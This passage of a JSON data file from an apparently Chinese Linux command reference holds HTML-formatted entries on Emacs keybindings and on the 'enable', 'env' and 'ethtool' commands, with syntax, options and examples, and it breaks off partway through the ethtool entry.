打开一个文件，如果文件不存在，则创建一个文件\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">g</span> <span class=\"hljs-operator\">:</span> 取消未完成的命令\n</code></pre>\n<p>编辑</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">z</span> <span class=\"hljs-punctuation\">(</span><span class=\"hljs-variable\">redefined</span><span class=\"hljs-punctuation\">)</span><span class=\"hljs-operator\">:</span> <span class=\"hljs-variable\">Undo</span>；原来<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">z</span>是挂起<span class=\"hljs-variable\">Emacs</span>（然后用<span class=\"hljs-variable\">fg</span>命令调出）；<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-variable\">u</span> 是默认的命令； 移动一下光标，再<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">z</span>就可以<span class=\"hljs-variable\">redo</span>\n<span class=\"hljs-variable\">M</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">d</span> <span class=\"hljs-operator\">:</span> 删除光标后的词语\n</code></pre>\n<p>移动光标</p>\n<pre><code class=\"language-shell\">C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；<span class=\"hljs-string\">\"M-数字 命令\"</span> 也可以\nM-x <span class=\"hljs-keyword\">goto</span>-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央\n</code></pre>\n<p>Buffer 相关</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-variable\">k</span> <span class=\"hljs-operator\">:</span> 关闭当前<span class=\"hljs-variable\">buffer</span>\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-variable\">b</span> <span class=\"hljs-operator\">:</span> 切换到前一个编辑的<span class=\"hljs-variable\">buffer</span>\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">b</span> <span class=\"hljs-operator\">:</span> 列出当前所有<span class=\"hljs-variable\">buffer</span>\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">s</span> <span class=\"hljs-operator\">:</span> 保存当前<span class=\"hljs-variable\">buffer</span>\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-variable\">s</span> <span class=\"hljs-operator\">:</span> 保存所有未保存的<span class=\"hljs-variable\">buffer</span>，会提示你是否需要保存\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">w</span> <span class=\"hljs-operator\">:</span> 文件另存为\n</code></pre>\n<p>拷贝与粘贴</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">M-space (redefined)</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">设置mark; C-@ 是默认命令</span>\n<span class=\"hljs-attribute\">C-w (redefined)</span><span class=\"hljs-punctuation\"> :</span> <span class=\"hljs-string\">剪切一块区域；如果没有设置mark，则是剪切一行</span>\n<span class=\"hljs-attribute\">M-w (redefined)</span><span class=\"hljs-punctuation\"> :</span> <span class=\"hljs-string\">拷贝一块区域；如果没有设置mark, 则是拷贝一行</span>\n<span class=\"hljs-attribute\">C-k</span><span class=\"hljs-punctuation\"> :</span> <span class=\"hljs-string\">从当前位置剪切到行尾</span>\n<span class=\"hljs-attribute\">C-y</span><span class=\"hljs-punctuation\"> :</span> <span class=\"hljs-string\">粘贴</span>\n<span class=\"hljs-attribute\">M-y</span><span class=\"hljs-punctuation\"> :</span> <span class=\"hljs-string\">用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。</span>\n<span class=\"hljs-attribute\">C-x r k</span><span class=\"hljs-punctuation\"> :</span> <span class=\"hljs-string\">执行矩形区域的剪切</span>\n<span class=\"hljs-attribute\">C-x r y</span><span class=\"hljs-punctuation\"> :</span> <span class=\"hljs-string\">执行矩形区域的粘贴</span>\n</code></pre>\n<pre><code class=\"language-shell\">窗口操作\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-operator\">:</span> 关闭当前窗口\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-operator\">:</span> 将当前窗口最大化\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-operator\">:</span> 垂直分割窗口\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-operator\">:</span> 水平分割窗口\n<span class=\"hljs-variable\">M</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">o</span> <span class=\"hljs-punctuation\">(</span><span class=\"hljs-variable\">redefined</span><span class=\"hljs-punctuation\">)</span> <span class=\"hljs-operator\">:</span> 在窗口之间切换<span class=\"hljs-operator\">;</span> <span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-variable\">o</span> 是默认命令\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-number\">5</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">2</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">3</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">0</span> <span class=\"hljs-operator\">:</span> 对<span class=\"hljs-variable\">frame</span>类似的操作\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-operator\">&lt;</span> <span class=\"hljs-operator\">:</span> 窗口内容右卷\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-operator\">&gt;</span> <span class=\"hljs-operator\">:</span> 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n<span class=\"hljs-punctuation\">(</span><span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">u</span><span class=\"hljs-punctuation\">)</span> <span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-operator\">^</span> <span class=\"hljs-operator\">:</span> 加高当前窗口，如果有<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">u</span>，则每次加高<span class=\"hljs-number\">4</span>行\n<span class=\"hljs-punctuation\">(</span><span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">u</span><span class=\"hljs-punctuation\">)</span> <span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-punctuation\">}</span> <span class=\"hljs-operator\">:</span> 加宽当前窗口\n<span class=\"hljs-punctuation\">(</span><span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">u</span><span class=\"hljs-punctuation\">)</span> <span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-punctuation\">{</span> <span class=\"hljs-operator\">:</span> 压窄当前窗口\n<span class=\"hljs-variable\">ESC</span> <span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">v</span> <span class=\"hljs-operator\">:</span> 在其它窗口进行卷屏操作\n</code></pre>\n<p>搜索和替换</p>\n<pre><code class=\"language-shell\">C-s : 向前搜索（增量式搜索）；连续<span class=\"hljs-type\">C</span>-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换\n</code></pre>\n<p>Tags</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">M</span>-! <span class=\"hljs-string\">etags</span> .<span class=\"hljs-string\">c</span> .<span class=\"hljs-string\">h</span> : 创建<span class=\"hljs-string\">TAGS</span>文件\n<span class=\"hljs-string\">M</span>-. : 跳到<span class=\"hljs-string\">tag</span>所在位置\n<span class=\"hljs-string\">M-x</span> <span class=\"hljs-built_in\">list-tags</span> : 列出<span class=\"hljs-string\">tags</span>\n</code></pre>\n<p>书签</p>\n<pre><code class=\"language-shell\">C-x r m : 设置书签<span class=\"hljs-type\">bookmark</span>\nC-x r b : 跳到<span class=\"hljs-type\">bookmark</span>处\n</code></pre>\n<p>帮助</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">h</span> <span class=\"hljs-operator\">?</span> <span class=\"hljs-operator\">:</span> 查看帮助信息\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">h</span> <span class=\"hljs-variable\">f</span> <span class=\"hljs-operator\">:</span> 查看一个函数\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">h</span> <span class=\"hljs-variable\">v</span> <span class=\"hljs-operator\">:</span> 查看一个变量\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">h</span> <span class=\"hljs-variable\">k</span> <span class=\"hljs-operator\">:</span> 查看一个键绑定 <span class=\"hljs-punctuation\">(</span><span class=\"hljs-built_in\">C</span>－<span class=\"hljs-variable\">h</span> <span class=\"hljs-variable\">c</span> 也是查看键绑定，但是信息较简略<span class=\"hljs-punctuation\">)</span>\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">h</span> <span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">f</span> <span class=\"hljs-operator\">:</span> 查看一个函数的<span class=\"hljs-variable\">info</span>，非常有用\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">h</span> <span class=\"hljs-variable\">i</span> <span class=\"hljs-operator\">:</span> 看<span class=\"hljs-variable\">Info</span>\n</code></pre>\n<p>其它</p>\n<pre><code class=\"language-shell\">C-M-\\ : 对选中区域，按照某种格式(比如<span class=\"hljs-type\">C</span>程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部<span class=\"hljs-type\">shell</span>命令\nM-x shell : 模拟<span class=\"hljs-type\">shell</span>的buffer\nM-x term : 模拟<span class=\"hljs-type\">terminal</span>, C-c k 关闭terminal\nC-x C-q : 修改<span class=\"hljs-type\">buffer</span>的只读属性\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "enable",
        "des": "启动或禁用shell内建命令",
        "body": "<h1 id=\"enable\">enable</h1>\n<p>启动或禁用shell内建命令</p>\n<h3 id=\"概要\">概要</h3>\n<p>enable [-a] [-dnps] [-f filename] [name ...]</p>\n<h3 id=\"主要用途\">主要用途</h3>\n<ul>\n<li><p>禁用一到多个内建命令。</p>\n</li>\n<li><p>启用一到多个内建命令。</p>\n</li>\n<li><p>直接调用与禁用的内建命令同名且在<code>$PATH</code>路径下找到的外部命令。</p>\n</li>\n<li><p>打印所有内建命令，无论是否禁用。</p>\n</li>\n<li><p>打印处于启用状态的内建命令。</p>\n</li>\n<li><p>打印处于禁用状态的内建命令。</p>\n</li>\n<li><p>打印处于启用状态的posix标准内建命令。</p>\n</li>\n<li><p>打印处于禁用状态的posix标准内建命令。</p>\n</li>\n<li><p>打印posix标准内建命令，无论是否禁用。</p>\n</li>\n<li><p>从动态库中加载内建命令。</p>\n</li>\n<li><p>移除从动态库中加载的内建命令。</p>\n</li>\n</ul>\n<h4 id=\"选项\">选项</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a 打印所有内建命令，无论是否禁用。</span>\n<span class=\"hljs-deletion\">-d 移除从动态库中加载的内建命令。</span>\n<span class=\"hljs-deletion\">-n 禁用内建命令或显示已禁用的内建命令。</span>\n<span class=\"hljs-deletion\">-p 以可复用格式打印。</span>\n<span class=\"hljs-deletion\">-s 只显示处于启动状态的posix标准内建命令。</span>\n<span class=\"hljs-deletion\">-f 动态库中加载内建命令。</span>\n<span class=\"hljs-deletion\">-ns 打印处于禁用状态的posix标准内建命令。</span>\n<span class=\"hljs-deletion\">-as 打印posix标准内建命令，无论是否禁用。</span>\n</code></pre>\n<h4 id=\"参数\">参数</h4>\n<p>filename：动态库文件名。</p>\n<p>name（可选）：内建命令，可以为多个。</p>\n<h4 id=\"返回值\">返回值</h4>\n<p>enable返回成功，除非name不是内建命令或有错误发生。</p>\n<h3 id=\"例子（以下内容限于篇幅不再列出返回值部分）\">例子（以下内容限于篇幅不再列出返回值部分）</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># posix special builtin</span>\n<span class=\"hljs-comment\"># 假设没有任何内建命令被禁用</span>\n<span class=\"hljs-comment\"># 禁用两个posix标准内建命令</span>\n<span class=\"hljs-built_in\">enable</span> -n <span class=\"hljs-built_in\">set</span> source\n<span class=\"hljs-comment\"># 打印处于禁用状态的posix标准内建命令</span>\n<span class=\"hljs-built_in\">enable</span> -ns\n<span class=\"hljs-comment\"># 打印posix标准内建命令，无论是否禁用。</span>\n<span class=\"hljs-built_in\">enable</span> -as\n<span class=\"hljs-comment\"># 打印处于启用状态的posix标准内建命令</span>\n<span class=\"hljs-built_in\">enable</span> -s\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 假设没有任何内建命令被禁用</span>\n<span class=\"hljs-comment\"># 禁用一到多个内建命令</span>\n<span class=\"hljs-built_in\">enable</span> -n echo pwd\n<span class=\"hljs-comment\"># 打印所有内建命令，无论是否禁用。</span>\n<span class=\"hljs-built_in\">enable</span> -a\n<span class=\"hljs-comment\"># 打印处于启用状态的内建命令</span>\n<span class=\"hljs-built_in\">enable</span>\n<span class=\"hljs-comment\"># 打印处于禁用状态的内建命令</span>\n<span class=\"hljs-built_in\">enable</span> -n\n<span class=\"hljs-comment\"># 启用一到多个内建命令</span>\n<span class=\"hljs-built_in\">enable</span> pwd\n</code></pre>\n<h3 id=\"qa\">Q&amp;A</h3>\n<p>Q：请问<code>-f</code>，<code>-d</code>，<code>-p</code>的演示呢？</p>\n<p>A：说明一下，<code>-f</code>与<code>-d</code>限于个人能力没有找到合适的例子，如果您有更好的例子欢迎提pr；\n经过我验证<code>-p</code>选项是否使用好像没有区别，可以比较<code>enable -p|cat -A</code>和<code>enable|cat -A</code> 有什么区别。（注：<code>cat -A</code>用于显示不可见字符）</p>\n<p>Q：是否可以禁用<code>enable</code>自己？之后还能禁用或启用内建命令吗？</p>\n<p>A：可以；不能。</p>\n<h3 id=\"注意\">注意</h3>\n<blockquote>\n<p>linux shell命令执行时，shell总是先在自己的shell builtin中查找该命令，如果找到则执行该命令；如果找不到该命令，则会从环境变量<code>$PATH</code>指定的路径中依次去查找待执行的命令。看起来好像没有办法编写用户自己的命令来替代shell builtin命令。幸运的是，有了<code>enable</code>命令我们就能做到了。</p>\n</blockquote>\n<ol>\n<li>关于同名命令调用的优先级的知识，请先参考<code>builtin</code>命令的<em>提示</em>部分，然后继续阅读下面部分；</li>\n</ol>\n<p>  当内建命令<code>echo</code>没有禁用时，如果要调用外部命令<code>echo</code>，只能这样写<code>/usr/bin/echo</code>；</p>\n<p>  当我们禁用了<code>echo</code>后，优先级顺序变成了这样：</p>\n<p>  函数 &gt; 外部命令</p>\n<p>  如果执行命令的环境没有<code>echo</code>函数，那么调用的<code>echo</code>就是外部命令。</p>\n<ol start=\"2\">\n<li>该命令是bash内建命令，相关的帮助信息请查看 <code>help</code> 命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "env",
        "des": "显示系统中已存在的环境变量",
        "body": "<h1 id=\"env\">env</h1>\n<p>显示系统中已存在的环境变量</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>env命令</strong> 用于显示系统中已存在的环境变量，以及在定义的环境中执行指令。该命令只使用\"-\"作为参数选项时，隐藏了选项\"-i\"的功能。若没有设置任何选项和参数时，则直接显示当前的环境变量。</p>\n<p>如果使用env命令在新环境中执行指令时，会因为没有定义环境变量\"PATH\"而提示错误信息\"such file or directory\"。此时，用户可以重新定义一个新的\"PATH\"或者使用绝对路径。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">env</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-i：开始一个新的空的环境；</span>\n<span class=\"hljs-deletion\">-u&lt;变量名&gt;：从当前环境中删除指定的变量。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  变量定义：定义在新的环境中变量，定义多个变量定义用空格隔开。格式为“变量名=值”；</li>\n<li>  指定：指定要执行的指令和参数。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># env</span>\nhostname=LinServ-1\nTERM=linux\nSHELL=<span class=\"hljs-string\">/bin/bash</span>\nHISTSIZE=1000\nSSH_CLIENT=192.168.2.111 2705 22\nSSH_TTY=<span class=\"hljs-string\">/dev/pts/0</span>\nUSER=root\nLS_COLORS=no=00<span class=\"hljs-function\">:fi</span>=00<span class=\"hljs-function\">:di</span>=01;34<span class=\"hljs-function\">:ln</span>=01;36<span class=\"hljs-function\">:pi</span>=40;33<span class=\"hljs-function\">:so</span>=01;35<span class=\"hljs-function\">:bd</span>=40;33;01<span class=\"hljs-function\">:cd</span>=40;33;01<span class=\"hljs-function\">:or</span>=01;05;37;41<span class=\"hljs-function\">:mi</span>=01;05;37;41<span class=\"hljs-function\">:ex</span>=01;32:*<span class=\"hljs-string\">.cmd=01</span>;32:*<span class=\"hljs-string\">.exe=01</span>;32:*<span class=\"hljs-string\">.com=01</span>;32:*<span class=\"hljs-string\">.btm=01</span>;32:*<span class=\"hljs-string\">.bat=01</span>;32:*<span class=\"hljs-string\">.sh=01</span>;32:*<span class=\"hljs-string\">.csh=01</span>;32:*<span class=\"hljs-string\">.tar=01</span>;31:*<span class=\"hljs-string\">.tgz=01</span>;31:*<span class=\"hljs-string\">.arj=01</span>;31:*<span class=\"hljs-string\">.taz=01</span>;31:*<span class=\"hljs-string\">.lzh=01</span>;31:*<span class=\"hljs-string\">.zip=01</span>;31:*<span class=\"hljs-string\">.z=01</span>;31:*<span class=\"hljs-string\">.Z=01</span>;31:*<span class=\"hljs-string\">.gz=01</span>;31:*<span class=\"hljs-string\">.bz2=01</span>;31:*<span class=\"hljs-string\">.bz=01</span>;31:*<span class=\"hljs-string\">.tz=01</span>;31:*<span class=\"hljs-string\">.rpm=01</span>;31:*<span class=\"hljs-string\">.cpio=01</span>;31:*<span class=\"hljs-string\">.jpg=01</span>;35:*<span class=\"hljs-string\">.gif=01</span>;35:*<span class=\"hljs-string\">.bmp=01</span>;35:*<span class=\"hljs-string\">.xbm=01</span>;35:*<span class=\"hljs-string\">.xpm=01</span>;35:*<span class=\"hljs-string\">.png=01</span>;35:*<span class=\"hljs-string\">.tif=01</span>;35:\nmail=<span class=\"hljs-string\">/var/spool/mail/root</span>\nPATH=<span class=\"hljs-string\">/usr/kerberos/sbin</span>:<span class=\"hljs-string\">/usr/kerberos/bin</span>:<span class=\"hljs-string\">/usr/local/sbin</span>:<span class=\"hljs-string\">/usr/local/bin</span>:<span class=\"hljs-string\">/sbin</span>:<span class=\"hljs-string\">/bin</span>:<span class=\"hljs-string\">/usr/sbin</span>:<span class=\"hljs-string\">/usr/bin</span>:<span class=\"hljs-string\">/root/bin</span>\nINPUTRC=<span class=\"hljs-string\">/etc/inputrc</span>\n<span class=\"hljs-keyword\">pwd</span>=<span class=\"hljs-string\">/root</span>\nLANG=zh_CN.UTF-8\nSHLVL=1\nHOME=<span class=\"hljs-string\">/root</span>\nlogname=root\nSSH_CONNECTION=192.168.2.111 2705 192.168.2.2 22\nLESSOPEN=|<span class=\"hljs-string\">/usr/bin/lesspipe.sh</span> %s\nG_BROKEN_FILENAMES=1\n_=<span class=\"hljs-string\">/bin/env</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ethtool",
        "des": "显示或修改以太网卡的配置信息",
        "body": "<h1 id=\"ethtool\">ethtool</h1>\n<p>显示或修改以太网卡的配置信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>ethtool命令用于获取以太网卡的配置信息，或者修改这些配置。这个命令比较复杂，功能特别多。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ethtool <span class=\"hljs-selector-attr\">[ -a | -c | -g | -i | -d | -k | -r | -S |]</span> ethX\nethtool <span class=\"hljs-selector-attr\">[-A]</span> ethX <span class=\"hljs-selector-attr\">[autoneg on|off]</span> <span class=\"hljs-selector-attr\">[rx on|off]</span> <span class=\"hljs-selector-attr\">[tx on|off]</span>\nethtool <span class=\"hljs-selector-attr\">[-C]</span> ethX <span class=\"hljs-selector-attr\">[adaptive-rx on|off]</span> <span class=\"hljs-selector-attr\">[adaptive-tx on|off]</span> <span class=\"hljs-selector-attr\">[rx-usecs N]</span> <span class=\"hljs-selector-attr\">[rx-frames N]</span> <span class=\"hljs-selector-attr\">[rx-usecs-irq N]</span> <span class=\"hljs-selector-attr\">[rx-frames-irq N]</span> <span class=\"hljs-selector-attr\">[tx-usecs N]</span> <span class=\"hljs-selector-attr\">[tx-frames N]</span> <span class=\"hljs-selector-attr\">[tx-usecs-irq N]</span> <span class=\"hljs-selector-attr\">[tx-frames-irq N]</span> <span class=\"hljs-selector-attr\">[stats-block-usecs N]</span><span class=\"hljs-selector-attr\">[pkt-rate-low N]</span><span class=\"hljs-selector-attr\">[rx-usecs-low N]</span> <span class=\"hljs-selector-attr\">[rx-frames-low N]</span> <span class=\"hljs-selector-attr\">[tx-usecs-low N]</span> <span class=\"hljs-selector-attr\">[tx-frames-lowN]</span> <span class=\"hljs-selector-attr\">[pkt-rate-high N]</span> <span class=\"hljs-selector-attr\">[rx-usecs-high N]</span> <span class=\"hljs-selector-attr\">[rx-frames-high N]</span> <span class=\"hljs-selector-attr\">[tx-usecs-high N]</span> <span class=\"hljs-selector-attr\">[tx-frames-high N]</span> <span class=\"hljs-selector-attr\">[sample-interval N]</span>\nethtool <span class=\"hljs-selector-attr\">[-G]</span> ethX <span class=\"hljs-selector-attr\">[rx N]</span> <span class=\"hljs-selector-attr\">[rx-mini N]</span> <span class=\"hljs-selector-attr\">[rx-jumbo N]</span> <span class=\"hljs-selector-attr\">[tx N]</span>\nethtool <span class=\"hljs-selector-attr\">[-e]</span> ethX <span class=\"hljs-selector-attr\">[raw on|off]</span> <span class=\"hljs-selector-attr\">[offset N]</span> <span class=\"hljs-selector-attr\">[length N]</span>\nethtool <span class=\"hljs-selector-attr\">[-E]</span> ethX <span class=\"hljs-selector-attr\">[magic N]</span> <span class=\"hljs-selector-attr\">[offset N]</span> <span class=\"hljs-selector-attr\">[value N]</span>\nethtool <span class=\"hljs-selector-attr\">[-K]</span> ethX <span class=\"hljs-selector-attr\">[rx on|off]</span> <span class=\"hljs-selector-attr\">[tx on|off]</span> <span class=\"hljs-selector-attr\">[sg on|off]</span> <span class=\"hljs-selector-attr\">[tso on|off]</span>\nethtool <span class=\"hljs-selector-attr\">[-p]</span> ethX <span class=\"hljs-selector-attr\">[N]</span>\nethtool <span class=\"hljs-selector-attr\">[-t]</span> ethX <span class=\"hljs-selector-attr\">[offline|online]</span>\nethtool <span class=\"hljs-selector-attr\">[-s]</span> ethX <span class=\"hljs-selector-attr\">[speed 10|100|1000]</span> <span class=\"hljs-selector-attr\">[duplex half|full]</span> <span class=\"hljs-selector-attr\">[autoneg on|off]</span> <span class=\"hljs-selector-attr\">[port tp|aui|bnc|mii]</span> <span class=\"hljs-selector-attr\">[phyad N]</span> <span class=\"hljs-selector-attr\">[xcvr internal|external]</span>\n<span class=\"hljs-selector-attr\">[wol p|u|m|b|a|g|s|d...]</span> <span class=\"hljs-selector-attr\">[sopass xx:yy:zz:aa:bb:cc]</span> <span class=\"hljs-selector-attr\">[msglvl N]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a 查看网卡中 接收模块RX、发送模块TX和Autonegotiate模块的状态：启动on 或 停用off。</span>\n<span class=\"hljs-deletion\">-A 修改网卡中 接收模块RX、发送模块TX和Autonegotiate模块的状态：启动on 或 停用off。</span>\n<span class=\"hljs-deletion\">-c display the Coalesce information of the specified ethernet card。</span>\n<span class=\"hljs-deletion\">-C Change the Coalesce setting of the specified ethernet card。</span>\n<span class=\"hljs-deletion\">-g Display the rx/tx ring parameter information of the specified ethernet card。</span>\n<span class=\"hljs-deletion\">-G change the rx/tx ring setting of the specified ethernet card。</span>\n<span class=\"hljs-deletion\">-i 显示网卡驱动的信息，如驱动的名称、版本等。</span>\n<span class=\"hljs-deletion\">-d 显示register dump信息, 部分网卡驱动不支持该选项。</span>\n<span class=\"hljs-deletion\">-e 显示EEPROM dump信息，部分网卡驱动不支持该选项。</span>\n<span class=\"hljs-deletion\">-E 修改网卡EEPROM byte。</span>\n<span class=\"hljs-deletion\">-k 显示网卡Offload参数的状态：on 或 off，包括rx-checksumming、tx-checksumming等。</span>\n<span class=\"hljs-deletion\">-K 修改网卡Offload参数的状态。</span>\n<span class=\"hljs-deletion\">-p 用于区别不同ethX对应网卡的物理位置，常用的方法是使网卡port上的led不断的闪；N指示了网卡闪的持续时间，以秒为单位。</span>\n<span class=\"hljs-deletion\">-r 如果auto-negotiation模块的状态为on，则restarts auto-negotiation。</span>\n<span class=\"hljs-deletion\">-S 显示NIC- and driver-specific 的统计参数，如网卡接收/发送的字节数、接收/发送的广播包个数等。</span>\n<span class=\"hljs-deletion\">-t 让网卡执行自我检测，有两种模式：offline or online。</span>\n<span class=\"hljs-deletion\">-s 修改网卡的部分配置，包括网卡速度、单工/全双工模式、mac地址等。</span>\n</code></pre>\n<h3 id=\"数据来源\">数据来源</h3>\n<p>Ethtool命令显示的信息来源于网卡驱动层，即TCP/ip协议的链路层。该命令在Linux内核中实现的逻辑层次为：</p>\n<p>最重要的结构体<code>struct ethtool_ops</code>，该结构体成员为用于显示或修改以太网卡配置的一系列函数指针，见下表中的第二列。</p>\n<p>网卡驱动负责实现（部分）这些函数，并将其封装入<code>ethtool_ops</code>结构体，为网络核心层提供统一的调用接口。因此，不同的网卡驱动会给应用层返回不同的信息。<code>Ethtool命令选项</code>、<code>struct ethtool_ops成员函数</code>、<code>Ethtool命令显示参数的来源</code>，三者间的对应关系如下表所示：</p>\n<table>\n<tbody>\n<tr>\n<th style=\"width: 100px;\">命令选项</th>\n<th>struct ethtool_ops成员函数</th>\n<th>Ethtool命令显示参数的来源（以网卡驱动BNX2为例）</th></tr>\n<tr>\n<td>无 -s</td>\n<td>get_settingsget_wol get_msglevel get_link set_settings set_wol set_msglevel</td>\n<td>从网卡寄存器中获得网卡速度等信息，可配置。</td>\n</tr>\n<tr>\n<td>-a -A</td>\n<td>get_pauseparam set_pauseparam</td>\n<td>从网卡寄存器中获得Autonegotiate/RX/TX模块的状态：on oroff，可配置。</td>\n</tr>\n<tr>\n<td>-c -C</td>\n<td>get_coalesceset_coalesce</td>\n<td>从网卡寄存器中获得coalescing参数：TX/RX一个数据包后，推迟发生TX/RX中断的时间(us)/数据包个数。—减小该值可以提高网卡的响应时间。 当rx-usecs&amp;rx-frames同时被设为0时，RX中断停止。 当tx-usecs&amp;tx-frames同时被设为0时，TX中断停止。</td>\n</tr>\n<tr>\n<td>-g -G</td>\n<td>get_ringparam set_ringparam</td>\n<td>除当前TX/RX ring的值（从网卡寄存器中读取得到，可配置）外，其它为网卡bnx2自己固定的信息。</td>\n</tr>\n<tr>\n<td>-k -K</td>\n<td>get_rx_csumget_tx_csum get_sg get_tso set_rx_csum set_tx_csum set_sg 